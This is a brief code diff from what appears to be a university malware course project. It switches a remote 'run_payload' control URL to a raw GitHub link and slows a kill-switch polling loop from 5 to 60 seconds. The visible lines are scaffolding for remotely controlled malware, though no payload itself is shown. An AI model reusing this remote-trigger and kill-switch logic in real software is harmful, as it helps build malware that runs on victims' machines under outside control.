@@ -18,15 +18,14 @@ import crypt
 
 
 THIS_FILE = os.path.realpath(__file__)
-BASE_FLAG_URL = "https://api.github.com/repos/ucla-e1-malware/final-project-theoreos/contents/run_payload"
-
+BASE_FLAG_URL = "https://raw.githubusercontent.com/ucla-e1-malware/final-project-theoreos/refs/heads/main/run_payload"
 
 def kill_switch_loop():
     while True:
         if check_kill_switch():
             print("[*] Kill switch triggered. Shutting down.")
             os._exit(0)
-        time.sleep(5) 
+        time.sleep(60) 
 
 def check_kill_switch():
     import requests
